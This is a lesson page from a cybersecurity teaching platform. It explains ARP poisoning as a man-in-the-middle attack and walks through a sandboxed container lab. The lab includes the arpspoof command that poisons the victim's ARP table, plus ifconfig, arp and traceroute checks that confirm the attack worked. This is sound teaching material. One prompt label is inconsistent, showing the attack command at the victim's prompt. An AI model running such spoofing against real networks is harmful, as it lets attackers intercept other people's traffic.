---
title: "ARP Poisoning Attack"
teaching: 10
exercises: 30
questions:
- "What is an ARP Poisoning attack?"
- "Why is ARP vulnerable to such attacks?"
- "What can you do once you have successfully performed an ARP poisoning attack?"
objectives:
- "Follow instructions to successfully demonstrate an ARP poisoning attack."
keypoints:
- "Hacker needs to be on the same local network as the victim and server."
- "ARP Poisoning results in spurious entries in a victim's ARP table."
- "The affected ARP table causes the victim to transmit messages to the hacker inspite of using the server's IP address."
- "Unless the victim inspects the route to the server, this attack cannot be discovered."
---

## ARP Poisoning Attack

The ARP Spoofing attack is a typical *man-in-the-middle* attack by which a hacker who has gained access to 
communication between two parties, can subsequently monitor and relay modified communication between these 
parties without their knowledge.

The ARP (Address Resolution Protocol) protocol is used to discover the hardware MAC address given an IP address. 
An ARP message is broadcast to the local network, with the IP in question and the corresponding machine responds with 
its MAC address. The hardware MAC address is typically needed to route packets to the right machine on a local network. 
The mapping between IP and MAC addresses that have been discovered via ARP, are stored in an ARP table on each machine. 
A hacker on the same LAN as two communicating machines can send an ARP message providing their own MAC address in response 
to the IP address of either of the two machines. Thus, in effect, the hacker *poisons* the ARP table of these machines 
by injecting an erroneous IP address - MAC address mapping. As a result, messages intended for these machines will be 
routed to the hacker, allowing them to gain access to potentially sensitive data.

### Demonstration

The demonstration on CHEESEHub illustrates the ARP spoofing attack using three separate machines; a victim, server, and, hacker. 
The *arpspoof* software provided by the *dsniff* library is used in the hacker to perform an ARP spoofing attack on the victim. 
The hacker provides its own MAC address in response to the server’s IP address, causing all messages from the victim to the server 
to be routed through the hacker. We verify the success of the attack in two ways. 

1. We will inspect the ARP table on the victim and discover two separate MAC addresses for the server’s IP address, one each 
from the server and hacker. 
2. We look at the routing of packets from the victim to the server (for a simple *ping* command) to discover that packets are 
delivered using two hops, first to the hacker and then to the server rather than a single hop directly to the server.

> ## Getting Started
> 
> You will need to create an account on [CHEESEHub](https://www.hub.cheesehub.org) to work through this exercise.
> Each container in this demonstration has a web interface and is accessible through your web browser, no other special software 
> is needed.
{: .callout} 

We will start by first adding the ArpSpoof application:

![Add ArpSpoof]({{ page.root }}/fig/arpspoof/add-arpspoof.png)

Next, click the *View* link to go to the application-specific page and start the application containers:

![Start Containers]({{ page.root }}/fig/arpspoof/start-containers.png)

> ## Container Launch Errors
>
> If a container fails to start, you will see a flashing warning icon next to the container's name. Take a look at the logs to 
> determine the cause of failure and try deleting the application and restarting.
{: .callout}

Once all the containers have started, launch each container's web interface in a separate browser tab by clicking the icon 
next to the container's name:

![Launch Containers]({{ page.root }}/fig/arpspoof/launch-containers.png)

We will start with the hacker. On the hacker browser tab, click on **Hacker.ipynb** to open a Jupyter notebook with instructions on 
conducting the attack:

![Open Hacker Notebook]({{ page.root }}/fig/arpspoof/hacker-notebook.png)

The next step is to find the IP address of the server. On the server browser tab, launch a new terminal window from the Jupyter 
notebook page:

![Server Terminal]({{ page.root }}/fig/arpspoof/launch-server-terminal.png)

To find the IP address of the server, use the *ifconfig* command at the server terminal:

~~~
jovyan@arpspoofserver:~$ ifconfig
~~~
{: .language-bash}

~~~
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1376
	inet 10.32.0.6 netmask 255.240.0.0 broadcast 10.47.255.255
	...
~~~
{: .output}

Make a note of the *inet* address returned on your terminal. Next, we will determine the IP address of the victim.

Launch a terminal in the victim browser window:

![Open Victim Terminal]({{ page.root }}/fig/arpspoof/victim-terminal.png)

Find the IP address of the victim using *ifconfig* at the victim terminal:

~~~
victim@arpspoofvictim:~$ ifconfig
~~~
{: .language-bash}

~~~
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1376
	inet 10.32.0.7 netmask 255.240.0.0 broadcast 10.47.255.255
	...
~~~
{: .output}

Now, inspect the ARP table on the victim (it only has one entry; the gateway):

~~~
victim@arpspoofvictim:~$ arp -n
~~~
{: .language-bash}

~~~
Address		HWtype		HWaddress		Flags Mask		Iface
10.32.0.1	ether		4a:6a:33:20:03:02	C			eth0
~~~
{: .output}

Next ping the server:

~~~
victim@arpspoofvictim:~$ ping 10.32.0.6
~~~
{: .language-bash}

~~~
PING 10.32.0.6 (10.32.0.6): 56 data bytes
64 bytes from 10.32.0.6: icmp_seq=0 ttl=64 time=0.171 ms
64 bytes from 10.32.0.6: icmp_seq=1 ttl=64 time=0.096 ms
64 bytes from 10.32.0.6: icmp_seq=2 ttl=64 time=0.072 ms
64 bytes from 10.32.0.6: icmp_seq=3 ttl=64 time=0.085 ms
...
~~~
{: .output}

Recheck the ARP table on the victim:

~~~
victim@arpspoofvictim:~$ arp -n
~~~
{: .language-bash}

~~~
Address		HWtype		HWaddress		Flags Mask		Iface
10.32.0.1	ether		4a:6a:33:20:03:02	C			eth0
10.32.0.6	ether		fa:65:b8:f5:81:46	C			eth0
~~~
{: .output}

It now has an entry for the server's IP. Now check the route to the server:

~~~
victim@arpspoofvictim:~$ traceroute 10.32.0.6
~~~
{: .language-bash}

~~~
traceroute to 10.32.0.6 (10.32.0.6), 64 hops max
1	10.32.0.6	0.003ms		0.002ms		0.001ms
~~~
{: .output}

Now we will conduct the ARP poisoning attack from the hacker. Open a terminal window on the hacker:

![Open Hacker Terminal]({{ page.root }}/fig/arpspoof/launch-hacker-terminal.png)

Run the *arpspoof* command on the hacker terminal with the victim and server IP addresses:

~~~
victim@arpspoofvictim:~$ sudo arpspoof -t 10.32.0.7 10.32.0.6
~~~
{: .language-bash}

~~~
da:ee:b1:44:c2:78 7a:a8:53:6d:57:65 0806 42: arp reply 10.32.0.6 is-at da:ee:b1:44:c2:78
da:ee:b1:44:c2:78 7a:a8:53:6d:57:65 0806 42: arp reply 10.32.0.6 is-at da:ee:b1:44:c2:78
da:ee:b1:44:c2:78 7a:a8:53:6d:57:65 0806 42: arp reply 10.32.0.6 is-at da:ee:b1:44:c2:78
da:ee:b1:44:c2:78 7a:a8:53:6d:57:65 0806 42: arp reply 10.32.0.6 is-at da:ee:b1:44:c2:78
~~~
{: .output}

> ## Order of arguments
> Note the order of arguments to the *arpspoof* command; the victim IP comes first followed by 
> the server IP address.
{: .callout}

Now ping the server again from the victim. You may need to wait a bit to see the output below:

~~~
victim@arpspoofvictim:~$ ping 10.32.0.6
~~~
{: .language-bash}

~~~
PING 10.32.0.6 (10.32.0.6): 56 data bytes
64 bytes from 10.32.0.6: icmp_seq=0 ttl=64 time=0.121 ms
64 bytes from 10.32.0.6: icmp_seq=1 ttl=64 time=0.082 ms
64 bytes from 10.32.0.6: icmp_seq=2 ttl=64 time=0.071 ms
64 bytes from 10.32.0.6: icmp_seq=3 ttl=64 time=0.096 ms
...
~~~
{: .output}

Let's recheck the ARP tables on the victim:

~~~
victim@arpspoofvictim:~$ arp -n
~~~
{: .language-bash}

~~~
Address		HWtype		HWaddress		Flags Mask		Iface
10.32.0.1	ether		4a:6a:33:20:03:02	C			eth0
10.32.0.6	ether		da:ee:b1:44:c2:78	C			eth0
10.32.0.8	ether		da:ee:b1:44:c2:78	C			eth0
~~~
{: .output}

> ## What is wrong with this ARP table?
> Notice that the server's IP address entry now has a different MAC (HWaddress) that before.
> Also, there are two IP addresses, both with the same MAC address. 10.32.0.8 is the IP address 
> of the hacker. Astute observers will also note that this MAC address was the response the *arpspoof*
> command was returning.
{: .callout}

Now check the route from the victim to the server:

~~~
victim@arpspoofvictim:~$ traceroute 10.32.0.6
~~~
{: .language-bash}

~~~
traceroute to 10.32.0.6 (10.32.0.6), 64 hops max
1	10.32.0.8	0.003ms		0.002ms		0.002ms
2	10.32.0.6	0.002ms		0.002ms		0.002ms
~~~
{: .output}

> ## What does traceroute tell us?
> There are now two hops that each message from the victim to the server is taking; first to the hacker 
> and then to the server.
{: .callout}

{% include links.md %}

